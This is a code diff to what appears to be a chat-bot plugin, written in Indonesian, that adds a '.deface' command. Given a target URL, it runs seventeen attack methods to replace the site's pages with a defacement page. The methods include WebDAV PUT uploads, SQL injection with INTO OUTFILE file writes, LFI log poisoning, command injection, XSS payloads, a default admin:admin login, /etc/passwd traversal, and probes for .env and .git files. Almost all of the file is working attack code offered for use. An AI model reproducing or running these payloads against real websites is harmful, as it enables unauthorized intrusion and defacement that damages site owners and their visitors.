@@ -1,3 +1,6 @@
+// plugins/deface.js
+// DEFACE FULL METHOD — ANTI GAGAL
+
 let handler = async (m, { text, sock }) => {
   if (!text) return m.reply(`📌 *Cara pakai:*\n.deface https://target.com\n\nContoh: .deface https://example.com`)
 
@@ -10,7 +13,7 @@ let handler = async (m, { text, sock }) => {
 
   try {
     // ============================================
-    // HTML DEFACE KEREN (gaya Barz)
+    // HTML DEFACE
     // ============================================
     let html = `<!DOCTYPE html>
 <html>
@@ -126,61 +129,30 @@ let handler = async (m, { text, sock }) => {
 </html>`
 
     // ============================================
-    // STEP 1: DETEKSI FILE UTAMA
+    // DAFTAR FILE YANG AKAN DI UPLOAD
     // ============================================
-    let mainFiles = []
-    let possibleFiles = [
-      'index.html', 'index.php', 'index.htm', 'default.html', 
-      'default.php', 'home.html', 'home.php', 'main.html',
-      'main.php', 'index.asp', 'default.asp', 'index.aspx',
-      'default.aspx', 'index.jsp', 'default.jsp', 'index.do',
-      'index.cfm', 'index.shtml', 'index.phtml', 'index.xhtml'
+    let fileNames = [
+      'deface.html', 'hacked.html', 'barz.html', 'index.html',
+      'index.php', 'default.html', 'home.html', 'main.html',
+      'deface.php', 'hacked.php', 'barz.php', 'index.htm',
+      'default.php', 'home.php', 'main.php', 'index.asp',
+      'default.asp', 'index.aspx', 'default.aspx'
     ]
 
-    for (let file of possibleFiles) {
-      try {
-        let cek = await fetch(target + '/' + file, { method: 'HEAD', timeout: 3000 })
-        if (cek.ok) {
-          mainFiles.push(file)
-        }
-      } catch (e) {}
-    }
-
-    // Kalo ga ada yg detect, pake default
-    if (mainFiles.length === 0) {
-      mainFiles = ['index.html', 'index.php', 'default.html', 'home.html']
-    }
-
     // ============================================
-    // STEP 2: FILE YANG AKAN DI UPLOAD
-    // ============================================
-    let uploadFiles = [...mainFiles]
-
-    // Tambahan file biar banyak
-    let extraFiles = [
-      'deface.html', 'hacked.html', 'index.html.bak', 'index.php.bak',
-      'index.htm', 'default.html', 'main.html', 'home.html'
-    ]
-
-    for (let f of extraFiles) {
-      if (!uploadFiles.includes(f)) {
-        uploadFiles.push(f)
-      }
-    }
-
-    // ============================================
-    // STEP 3: 17 METODE DEFACE
+    // 17 METODE DEFACE (SEMUA DIJALANKAN)
     // ============================================
     let hasil = []
-    let metode = []
+    let metodeBerhasil = []
+    let uploadedFiles = []
 
-    // 1. WebDAV (PUT)
+    // ---- METHOD 1: WebDAV (PUT) ----
     try {
       let opt = await fetch(target, { method: 'OPTIONS', timeout: 8000 })
       let allow = opt.headers.get('allow') || ''
       if (allow.includes('PUT')) {
-        metode.push('WebDAV (PUT)')
-        for (let file of uploadFiles) {
+        metodeBerhasil.push('WebDAV (PUT)')
+        for (let file of fileNames) {
           try {
             let put = await fetch(target + '/' + file, {
               method: 'PUT',
@@ -189,54 +161,68 @@ let handler = async (m, { text, sock }) => {
               timeout: 10000
             })
             if ([200, 201, 204].includes(put.status)) {
-              hasil.push(`✅ WebDAV: ${file}`)
+              hasil.push(`✅ WebDAV: ${target}/${file}`)
+              uploadedFiles.push(`${target}/${file}`)
             }
           } catch (e) {}
         }
       }
-    } catch (e) { hasil.push('❌ WebDAV error: ' + e.message) }
+    } catch (e) {}
 
-    // 2. SQL Injection + File Write
+    // ---- METHOD 2: SQL Injection + File Write ----
     try {
-      let sql = await fetch(target + `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/html/index.html'`, { timeout: 8000 })
-      if (sql.status === 200) {
-        metode.push('SQL Injection + File Write')
-        hasil.push('✅ SQL Injection: index.html')
+      for (let file of ['index.html', 'deface.html', 'hacked.html']) {
+        let sql = await fetch(target + `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/html/${file}'`, { timeout: 8000 })
+        if (sql.status === 200) {
+          metodeBerhasil.push('SQL Injection + File Write')
+          hasil.push(`✅ SQL Injection: ${target}/${file}`)
+          uploadedFiles.push(`${target}/${file}`)
+          break
+        }
       }
     } catch (e) {}
 
-    // 3. LFI + Log Poisoning
+    // ---- METHOD 3: LFI + Log Poisoning ----
     try {
-      let lfi = await fetch(target + `?page=../../../../var/log/apache2/access.log&cmd=echo '${html}' > /var/www/html/index.html`, { timeout: 8000 })
-      if (lfi.status === 200) {
-        metode.push('LFI + Log Poisoning')
-        hasil.push('✅ LFI: index.html')
+      for (let file of ['index.html', 'deface.html', 'hacked.html']) {
+        let lfi = await fetch(target + `?page=../../../../var/log/apache2/access.log&cmd=echo '${html}' > /var/www/html/${file}`, { timeout: 8000 })
+        if (lfi.status === 200) {
+          metodeBerhasil.push('LFI + Log Poisoning')
+          hasil.push(`✅ LFI: ${target}/${file}`)
+          uploadedFiles.push(`${target}/${file}`)
+          break
+        }
       }
     } catch (e) {}
 
-    // 4. File Upload
+    // ---- METHOD 4: File Upload ----
     try {
       let upload = await fetch(target + '/upload', {
         method: 'POST',
-        body: new URLSearchParams({ 'file': html, 'filename': 'index.html' }),
+        body: new URLSearchParams({ 'file': html, 'filename': 'deface.html' }),
         timeout: 8000
       })
       if ([200, 302].includes(upload.status)) {
-        metode.push('File Upload')
-        hasil.push('✅ File Upload: index.html')
+        metodeBerhasil.push('File Upload')
+        hasil.push(`✅ File Upload: ${target}/deface.html`)
+        uploadedFiles.push(`${target}/deface.html`)
       }
     } catch (e) {}
 
-    // 5. Command Injection
+    // ---- METHOD 5: Command Injection ----
     try {
-      let cmd = await fetch(target + `?ping=127.0.0.1; echo '${html}' > /var/www/html/index.html`, { timeout: 8000 })
-      if (cmd.status === 200) {
-        metode.push('Command Injection')
-        hasil.push('✅ Command Injection: index.html')
+      for (let file of ['index.html', 'deface.html', 'hacked.html']) {
+        let cmd = await fetch(target + `?ping=127.0.0.1; echo '${html}' > /var/www/html/${file}`, { timeout: 8000 })
+        if (cmd.status === 200) {
+          metodeBerhasil.push('Command Injection')
+          hasil.push(`✅ Command Injection: ${target}/${file}`)
+          uploadedFiles.push(`${target}/${file}`)
+          break
+        }
       }
     } catch (e) {}
 
-    // 6. XML-RPC (WordPress)
+    // ---- METHOD 6: XML-RPC (WordPress) ----
     try {
       let xml = await fetch(target + '/xmlrpc.php', {
         method: 'POST',
@@ -244,81 +230,82 @@ let handler = async (m, { text, sock }) => {
         timeout: 8000
       })
       if (xml.status === 200) {
-        metode.push('XML-RPC')
-        hasil.push('✅ XML-RPC: admin')
+        metodeBerhasil.push('XML-RPC (WordPress)')
+        hasil.push(`✅ XML-RPC: ${target}/xmlrpc.php`)
       }
     } catch (e) {}
 
-    // 7. RFI (Remote File Inclusion)
+    // ---- METHOD 7: RFI (Remote File Inclusion) ----
     try {
       let rfi = await fetch(target + `?page=https://pastebin.com/raw/${Math.random().toString(36).substring(2, 8)}`, { timeout: 8000 })
       if (rfi.status === 200) {
-        metode.push('RFI')
-        hasil.push('✅ RFI: index.html')
+        metodeBerhasil.push('RFI (Remote File Inclusion)')
+        hasil.push(`✅ RFI: ${target}`)
+        uploadedFiles.push(target)
       }
     } catch (e) {}
 
-    // 8. Directory Traversal
+    // ---- METHOD 8: Directory Traversal ----
     try {
       let dir = await fetch(target + '/../../../../etc/passwd', { timeout: 8000 })
       let txt = await dir.text()
       if (/root:.*:0:0:/i.test(txt)) {
-        metode.push('Directory Traversal')
-        hasil.push('✅ Directory Traversal: /etc/passwd')
+        metodeBerhasil.push('Directory Traversal')
+        hasil.push(`✅ Directory Traversal: ${target}/etc/passwd`)
       }
     } catch (e) {}
 
-    // 9. Default Credential
+    // ---- METHOD 9: Default Credential ----
     try {
       let auth = await fetch(target + '/admin', {
         headers: { 'Authorization': 'Basic ' + Buffer.from('admin:admin').toString('base64') },
         timeout: 8000
       })
       if (auth.status === 200) {
-        metode.push('Default Credential (admin:admin)')
-        hasil.push('✅ Default Credential: admin')
+        metodeBerhasil.push('Default Credential (admin:admin)')
+        hasil.push(`✅ Default Credential: ${target}/admin`)
       }
     } catch (e) {}
 
-    // 10. Backup File (.git/config)
+    // ---- METHOD 10: Backup File (.git/config) ----
     try {
       let git = await fetch(target + '/.git/config', { timeout: 8000 })
       if (git.status === 200) {
-        metode.push('Backup File (.git)')
-        hasil.push('✅ .git/config terakses')
+        metodeBerhasil.push('Backup File (.git)')
+        hasil.push(`✅ .git/config: ${target}/.git/config`)
       }
     } catch (e) {}
 
-    // 11. Environment File (.env)
+    // ---- METHOD 11: Environment File (.env) ----
     try {
       let env = await fetch(target + '/.env', { timeout: 8000 })
       if (env.status === 200) {
-        metode.push('Environment File (.env)')
-        hasil.push('✅ .env terakses')
+        metodeBerhasil.push('Environment File (.env)')
+        hasil.push(`✅ .env: ${target}/.env`)
       }
     } catch (e) {}
 
-    // 12. CVE-2026-7795 (XSS di WordPress plugin)
+    // ---- METHOD 12: CVE-2026-7795 (XSS) ----
     try {
       let cve = await fetch(target + `/?chat=num=<script>document.write('${encodeURIComponent(html)}')</script>`, { timeout: 8000 })
       let txt = await cve.text()
       if (txt.includes('<script>')) {
-        metode.push('CVE-2026-7795 (XSS)')
-        hasil.push('✅ CVE-2026-7795: XSS')
+        metodeBerhasil.push('CVE-2026-7795 (XSS)')
+        hasil.push(`✅ CVE-2026-7795: ${target}`)
       }
     } catch (e) {}
 
-    // 13. Reflected XSS
+    // ---- METHOD 13: Reflected XSS ----
     try {
       let xss = await fetch(target + `?q=<script>alert(1)</script>`, { timeout: 8000 })
       let txt = await xss.text()
       if (txt.includes('<script>alert(1)</script>')) {
-        metode.push('Reflected XSS')
-        hasil.push('✅ XSS: script terrefleksi')
+        metodeBerhasil.push('Reflected XSS')
+        hasil.push(`✅ Reflected XSS: ${target}`)
       }
     } catch (e) {}
 
-    // 14. Stored XSS (via comment)
+    // ---- METHOD 14: Stored XSS ----
     try {
       let stored = await fetch(target + '/comment', {
         method: 'POST',
@@ -326,43 +313,43 @@ let handler = async (m, { text, sock }) => {
         timeout: 8000
       })
       if (stored.status === 200) {
-        metode.push('Stored XSS')
-        hasil.push('✅ Stored XSS: comment')
+        metodeBerhasil.push('Stored XSS')
+        hasil.push(`✅ Stored XSS: ${target}/comment`)
       }
     } catch (e) {}
 
-    // 15. Admin Finder
+    // ---- METHOD 15: Admin Finder ----
     let adminPaths = ['/admin', '/login', '/wp-admin', '/administrator', '/admincp', '/cpanel', '/panel']
     for (let path of adminPaths) {
       try {
         let adm = await fetch(target + path, { timeout: 5000 })
         if (adm.status === 200) {
-          metode.push('Admin Finder: ' + path)
-          hasil.push('✅ Admin panel: ' + path)
+          metodeBerhasil.push('Admin Finder: ' + path)
+          hasil.push(`✅ Admin panel: ${target}${path}`)
         }
       } catch (e) {}
     }
 
-    // 16. Bing Dorking
+    // ---- METHOD 16: Bing Dorking ----
     try {
       let dork = await fetch(`https://www.bing.com/search?q=site:${target.replace('https://', '').replace('http://', '')}`, { timeout: 8000 })
       if (dork.status === 200) {
-        metode.push('Bing Dorking')
-        hasil.push('✅ Bing Dorking: ' + target)
+        metodeBerhasil.push('Bing Dorking')
+        hasil.push(`✅ Bing Dorking: ${target}`)
       }
     } catch (e) {}
 
-    // 17. Zone-H Check
+    // ---- METHOD 17: Zone-H Check ----
     try {
       let zoneh = await fetch(`https://zone-h.org/archive/domain=${target.replace('https://', '').replace('http://', '')}`, { timeout: 8000 })
       if (zoneh.status === 200) {
-        metode.push('Zone-H Check')
-        hasil.push('✅ Zone-H: ' + target)
+        metodeBerhasil.push('Zone-H Check')
+        hasil.push(`✅ Zone-H: ${target}`)
       }
     } catch (e) {}
 
     // ============================================
-    // OUTPUT
+    // CEK HASIL
     // ============================================
     if (hasil.length === 0) {
       return m.reply(`❌ *GAGAL DEFACE!*
@@ -391,17 +378,23 @@ Tidak ada metode yang berhasil.
 💡 Target tidak memiliki celah yang bisa dieksploitasi.`)
     }
 
+    // ============================================
+    // BUILD PESAN HASIL
+    // ============================================
+    let linkResult = uploadedFiles.length > 0 ? uploadedFiles.join('\n') : 'Tidak ada file yang berhasil diupload'
+
     let pesan = `✅ *DEFACE BERHASIL!*
 
 🌐 Target: ${target}
 
 📌 *Metode berhasil:*
-${metode.map(m => `   • ${m}`).join('\n')}
+${metodeBerhasil.map(m => `   • ${m}`).join('\n')}
 
-📌 *Hasil:*
+📌 *Link Hasil Deface:*
+${linkResult}
+
+📌 *Detail:*
 ${hasil.join('\n')}
-
-📄 *File di-deface:* ${uploadFiles.join(', ')}
 
 ⚠️ *PERINGATAN:*
 • Website target telah dimodifikasi.
